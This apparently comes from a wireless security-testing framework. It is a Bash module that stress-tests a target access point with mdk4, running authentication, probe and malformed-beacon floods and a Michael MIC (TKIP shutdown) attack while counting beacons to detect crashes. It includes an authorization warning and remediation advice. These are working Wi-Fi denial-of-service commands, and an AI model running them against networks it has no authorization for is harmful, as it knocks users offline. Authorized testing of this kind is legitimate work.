#!/usr/bin/env bash
# MODULE_META
# NAME="Wireless Fuzzing & AP Stress"
# CATEGORY="E"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="mdk4"
# DESC="Auth/probe/assoc flood, Michael MIC, malformed frames to test AP robustness"
# REQS="monitor_iface,target_ssid,target_bssid,target_channel,injection_required"
# PCAP="yes"
# DECODE="wifi_mgmt"

set -uo pipefail

#===============================================================================
#  modules/e4_wireless_fuzzing.sh
#  E4: Wireless Fuzzing & AP Stress Testing
#
#  PURPOSE:
#    Send malformed, oversized, and unexpected 802.11 management frames to
#    test AP robustness and firmware stability. Checks if APs crash, hang,
#    or behave unexpectedly under stress. Inspired by WiFiForge/Scapy-based
#    fuzzers and commercial AP testing tools.
#
#  TOOLS: ${TOOL_PATHS[mdk4]}, ${TOOL_PATHS[tcpdump]}, scapy (python3), ping
#  PHASE: 2A — Attack Simulations
#  DEPENDENCIES: A1 (needs target SSID/BSSID/channel)
#
#  EVIDENCE PRODUCED:
#    - e4_fuzz_log.txt                (fuzzing test log with responses)
#    - e4_ap_health.txt               (AP health checks before/after)
#    - e4_capture.pcap                (captured responses during fuzzing)
#    - e4_findings.txt                (analysis summary)
#
#  RESULT JSON FIELDS:
#    - tests_run: int
#    - ap_crashed: bool
#    - ap_rebooted: bool
#    - beacon_lost: bool
#    - response_anomalies: int
#===============================================================================

run_e4() {
    local total_steps=7
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/e4"

    #--- Step 1: Verify tools ---
    log_step 1 $total_steps "Verifying tools"
    update_tc_progress 1 $total_steps "Checking"

    check_module_dependencies "E4" || return 1

    local has_mdk4=false
    local has_scapy=false

    command -v mdk4 &>/dev/null && has_mdk4=true
    python3 -c "from scapy.all import *" &>/dev/null 2>&1 && has_scapy=true

    if [[ "$has_mdk4" == "false" && "$has_scapy" == "false" ]]; then
        log_error "Either mdk4 or python3-scapy is required."
        return 1
    fi

    if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
        log_warn "Target SSID/BSSID not set."
        if ! select_target_network; then
            log_error "No target selected. Run A1 first or enter manually."
            return 1
        fi
    fi

    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID}) CH ${GUEST_CHANNEL:-auto}"

    #--- Warning banner ---
    echo ""
    echo -e "${C_BG_RED}${C_WHITE}${C_BOLD}"
    echo "  ╔════════════════════════════════════════════════════════════════════╗"
    echo "  ║  ★ WIRELESS FUZZING & AP STRESS TEST ★                          ║"
    echo "  ║                                                                    ║"
    echo "  ║  This test sends malformed and stress-inducing frames:            ║"
    echo "  ║    • Authentication flood (thousands of fake clients)             ║"
    echo "  ║    • Beacon frame injection (malformed fields)                    ║"
    echo "  ║    • Probe flood (high-rate probe requests)                       ║"
    echo "  ║    • Association flood (exhaust AP client table)                  ║"
    echo "  ║    • Oversized/malformed management frames                        ║"
    echo "  ║                                                                    ║"
    echo "  ║  ⚠  This MAY crash or reboot the target AP.                     ║"
    echo "  ║  ⚠  Ensure you have authorization for destructive testing.      ║"
    echo "  ╚════════════════════════════════════════════════════════════════════╝"
    echo -e "${C_RESET}"
    echo ""
    get_or_request_param "confirm" "  Proceed with AP stress testing? [Y/n]"
    [[ "${confirm,,}" == "n" ]] && return 1

    local tests_run=0
    local ap_crashed="false"
    local ap_rebooted="false"
    local beacon_lost="false"
    local response_anomalies=0
    local findings_file="${evidence_prefix}_findings.txt"
    local fuzz_log="${evidence_prefix}_fuzz_log.txt"
    local health_file="${evidence_prefix}_ap_health.txt"
    local fuzz_pcap="${evidence_prefix}_capture.pcap"

    {
        echo "============================================================"
        echo "  E4: Wireless Fuzzing & AP Stress Test"
        echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Target: ${GUEST_SSID} (${GUEST_BSSID})"
        echo "============================================================"
        echo ""
    } > "$findings_file"

    {
        echo "============================================================"
        echo "  Fuzzing Test Log"
        echo "============================================================"
        echo ""
    } > "$fuzz_log"

    #--- Step 2: Enable monitor mode & baseline ---
    log_step 2 $total_steps "Establishing AP health baseline"
    update_tc_progress 2 $total_steps "Baseline"

    enable_monitor_mode || return 1
    local mon_iface="${MONITOR_INTERFACE}"

    if [[ -n "${GUEST_CHANNEL:-}" ]]; then
        iw dev "$mon_iface" set channel "$GUEST_CHANNEL" 2>/dev/null || true
    fi

    {
        echo "============================================================"
        echo "  AP Health Checks"
        echo "============================================================"
        echo ""
        echo "=== Baseline (before fuzzing) ==="
    } > "$health_file"

    # Count beacons per 10 seconds as baseline
    local baseline_beacons
    baseline_beacons=$(timeout 10 run_fg "tcpdump" -i "$mon_iface" -c 1000 \
        "type mgt subtype beacon and ether src ${GUEST_BSSID}" \
        2>/dev/null | wc -l) || true
    baseline_beacons=${baseline_beacons:-0}

    echo "Baseline beacon count (10s): ${baseline_beacons}" >> "$health_file"
    log_info "Baseline: ${baseline_beacons} beacons/10s from target AP"

    # Start continuous monitoring
    spawn_bg "e4_tcpdump" "tcpdump" -i "$mon_iface" -w "$fuzz_pcap" \
        "ether src ${GUEST_BSSID} or ether dst ${GUEST_BSSID}"

    check_abort || return 1

    # --- Helper: Check AP health ---
    _check_ap_alive() {
        local test_name="$1"
        local beacons
        beacons=$(timeout 10 run_fg "tcpdump" -i "$mon_iface" -c 100 \
            "type mgt subtype beacon and ether src ${GUEST_BSSID}" \
            2>/dev/null | wc -l) || true
        beacons=${beacons:-0}

        echo "After ${test_name}: ${beacons} beacons/10s" >> "$health_file"

        if [[ $beacons -eq 0 && ${baseline_beacons:-0} -gt 0 ]]; then
            return 1  # AP may be down
        fi
        return 0
    }

    #--- Step 3: Test 1 — Authentication flood ---
    log_step 3 $total_steps "Test 1: Authentication flood"
    update_tc_progress 3 $total_steps "Auth flood"

    check_abort || return 1

    echo "[$(date '+%H:%M:%S')] TEST 1: Authentication Flood" >> "$fuzz_log"

    if [[ "$has_mdk4" == "true" ]]; then
        log_info "Sending auth flood for 15 seconds..."
        spawn_bg "e4_mdk4_auth" "mdk4" "$mon_iface" a -a "${GUEST_BSSID}"
        sleep 15
        stop_process "e4_mdk4_auth"
        ((tests_run++))
    fi

    sleep 5
    if ! _check_ap_alive "Auth Flood"; then
        beacon_lost="true"
        ap_crashed="true"
        log_result "FINDING" "AP beacons LOST after auth flood — possible crash!"
        echo "FINDING: AP beacons lost after auth flood" >> "$findings_file"
        ((response_anomalies++))
    fi

    check_abort || return 1

    #--- Step 4: Test 2 — Association flood ---
    log_step 4 $total_steps "Test 2: Association/Probe flood"
    update_tc_progress 4 $total_steps "Assoc flood"

    echo "" >> "$fuzz_log"
    echo "[$(date '+%H:%M:%S')] TEST 2: Probe Request Flood" >> "$fuzz_log"

    if [[ "$has_mdk4" == "true" ]]; then
        # Probe flood — send thousands of probe requests
        log_info "Sending probe flood for 15 seconds..."
        spawn_bg "e4_mdk4_probe" "mdk4" "$mon_iface" p -t "${GUEST_BSSID}" -c "${GUEST_CHANNEL:-1}"
        sleep 15
        stop_process "e4_mdk4_probe"
        ((tests_run++))
    fi

    sleep 5
    if ! _check_ap_alive "Probe Flood"; then
        beacon_lost="true"
        log_result "FINDING" "AP beacons LOST after probe flood!"
        echo "FINDING: AP beacons lost after probe flood" >> "$findings_file"
        ((response_anomalies++))
    fi

    check_abort || return 1

    #--- Step 5: Test 3 — Michael MIC attack (TKIP) ---
    log_step 5 $total_steps "Test 3: Michael shutdown + beacon stress"
    update_tc_progress 5 $total_steps "Michael/Beacon"

    echo "" >> "$fuzz_log"
    echo "[$(date '+%H:%M:%S')] TEST 3: Michael MIC Exploit (TKIP countermeasure)" >> "$fuzz_log"

    if [[ "$has_mdk4" == "true" ]]; then
        # Michael shutdown — exploits TKIP MIC countermeasure
        log_info "Sending Michael MIC exploit for 10 seconds..."
        spawn_bg "e4_mdk4_mic" "mdk4" "$mon_iface" m -t "${GUEST_BSSID}"
        sleep 10
        stop_process "e4_mdk4_mic"
        ((tests_run++))
    fi

    sleep 5

    # Beacon flood with malformed fields
    echo "[$(date '+%H:%M:%S')] TEST 3b: Beacon Flood (malformed)" >> "$fuzz_log"

    if [[ "$has_mdk4" == "true" ]]; then
        log_info "Sending malformed beacon flood for 10 seconds..."
        spawn_bg "e4_mdk4_beacon" "mdk4" "$mon_iface" b -a -w nta -m
        sleep 10
        stop_process "e4_mdk4_beacon"
        ((tests_run++))
    fi

    sleep 5
    if ! _check_ap_alive "Michael+Beacon Stress"; then
        beacon_lost="true"
        log_result "FINDING" "AP beacons LOST after Michael/beacon stress!"
        echo "FINDING: AP beacons lost after stress test" >> "$findings_file"
        ((response_anomalies++))
    fi

    check_abort || return 1

    #--- Step 6: Post-fuzz health check ---
    log_step 6 $total_steps "Post-fuzz AP health assessment"
    update_tc_progress 6 $total_steps "Health check"

    # Stop capture
    stop_process "e4_tcpdump"
    validate_pcap "$fuzz_pcap" "Fuzzing capture"

    echo "" >> "$health_file"
    echo "=== Post-Fuzzing Health Check ===" >> "$health_file"

    # Wait and recheck beacons
    sleep 10
    local post_beacons
    post_beacons=$(timeout 10 run_fg "tcpdump" -i "$mon_iface" -c 1000 \
        "type mgt subtype beacon and ether src ${GUEST_BSSID}" \
        2>/dev/null | wc -l) || true
    post_beacons=${post_beacons:-0}

    echo "Post-fuzz beacon count (10s): ${post_beacons}" >> "$health_file"

    if [[ $post_beacons -eq 0 && ${baseline_beacons:-0} -gt 0 ]]; then
        ap_crashed="true"
        beacon_lost="true"
        log_result "CRITICAL" "AP is NOT sending beacons after fuzzing — likely CRASHED"
        echo "CRITICAL: AP appears crashed — no beacons detected post-fuzz" >> "$findings_file"

        # Wait 60s to check for reboot
        log_info "Waiting 60s to check if AP reboots..."
        start_countdown 60 "Waiting for potential AP reboot"
        sleep 60
        stop_countdown

        local reboot_beacons
        reboot_beacons=$(timeout 10 run_fg "tcpdump" -i "$mon_iface" -c 100 \
            "type mgt subtype beacon and ether src ${GUEST_BSSID}" \
            2>/dev/null | wc -l) || true

        if [[ ${reboot_beacons:-0} -gt 0 ]]; then
            ap_rebooted="true"
            log_info "AP has recovered/rebooted — beacons resumed"
            echo "INFO: AP recovered after ~60s (likely rebooted)" >> "$findings_file"
        fi
    elif [[ $post_beacons -lt $((baseline_beacons / 2)) ]]; then
        ((response_anomalies++))
        log_result "FINDING" "AP beacon rate degraded (${baseline_beacons} → ${post_beacons})"
        echo "FINDING: Beacon rate degradation after fuzzing" >> "$findings_file"
    else
        log_success "AP survived fuzzing — beacon rate stable (${baseline_beacons} → ${post_beacons})"
    fi

    # Restore managed mode
    disable_monitor_mode
    sleep 3

    #--- Step 7: Save results ---
    log_step 7 $total_steps "Saving results"
    update_tc_progress 7 $total_steps "Saving"

    local result_status="SECURE"
    local result_summary=""
    local recommendations=""

    if [[ "$ap_crashed" == "true" ]]; then
        result_status="FINDING"
        result_summary="CRITICAL: AP crashed/rebooted during wireless fuzzing. "
        [[ "$ap_rebooted" == "true" ]] && result_summary+="AP auto-recovered after ~60s. "
        result_summary+="${tests_run} stress tests run, ${response_anomalies} anomalies detected."
        recommendations="1) Update AP firmware to the latest version — crash indicates firmware vulnerability. "
        recommendations+="2) Report AP model and firmware version to vendor for investigation. "
        recommendations+="3) Enable rate limiting for management frames on the WLC. "
        recommendations+="4) Deploy WIDS to detect and block flooding attacks. "
        recommendations+="5) Consider AP hardware with dedicated management frame processing."
    elif [[ $response_anomalies -gt 0 ]]; then
        result_status="FINDING"
        result_summary="AP showed degraded performance during fuzzing (${response_anomalies} anomalies) but did not crash. ${tests_run} tests run."
        recommendations="1) Monitor AP stability under load. "
        recommendations+="2) Enable management frame rate limiting. "
        recommendations+="3) Consider firmware update for improved resilience."
    else
        result_summary="AP survived all ${tests_run} wireless fuzzing tests without crashing or significant degradation."
        recommendations="AP firmware appears robust. Continue periodic testing after firmware updates."
    fi

    evidence_register_file "$fuzz_log"
    evidence_register_file "$health_file"
    evidence_register_file "$fuzz_pcap"
    evidence_register_file "$findings_file"

    local result_json
    result_json=$(run_fg "jq" -n \
        --arg status "$result_status" \
        --arg summary "$result_summary" \
        --arg details "Tests: ${tests_run}, Crashed: ${ap_crashed}, Rebooted: ${ap_rebooted}, Beacon lost: ${beacon_lost}, Anomalies: ${response_anomalies}" \
        --arg recommendations "$recommendations" \
        --argjson tests_run "$tests_run" \
        --arg ap_crashed "$ap_crashed" \
        --arg ap_rebooted "$ap_rebooted" \
        --arg beacon_lost "$beacon_lost" \
        --argjson response_anomalies "$response_anomalies" \
        '{
            status: $status,
            summary: $summary,
            details: $details,
            recommendations: $recommendations,
            tests_run: $tests_run,
            ap_crashed: ($ap_crashed == "true"),
            ap_rebooted: ($ap_rebooted == "true"),
            beacon_lost: ($beacon_lost == "true"),
            response_anomalies: $response_anomalies
        }')

    local has_tool_output=0
    [[ -f "$findings_file" || -f "$health_file" || -f "$fuzz_log" ]] && has_tool_output=1

    local has_primary=0
    [[ -f "$fuzz_pcap" ]] && has_primary=1

    local is_secure_claim=0
    [[ "$result_status" == "SECURE" ]] && is_secure_claim=1

    save_tc_result "E4" "$result_json" 1 $has_tool_output $has_primary 1 1 1 0 1 1 1 $is_secure_claim
    save_session_state

    echo ""
    if [[ "$ap_crashed" == "true" ]]; then
        log_result "CRITICAL" "★ AP CRASHED during fuzzing — firmware vulnerability ($(if [[ "$ap_rebooted" == "true" ]]; then echo "auto-recovered"; else echo "STILL DOWN"; fi))"
    elif [[ $response_anomalies -gt 0 ]]; then
        log_result "FINDING" "AP showed degradation under stress (${response_anomalies} anomalies)"
    else
        log_result "SECURE" "AP survived all ${tests_run} fuzzing tests — firmware robust"
    fi

    return 0
}
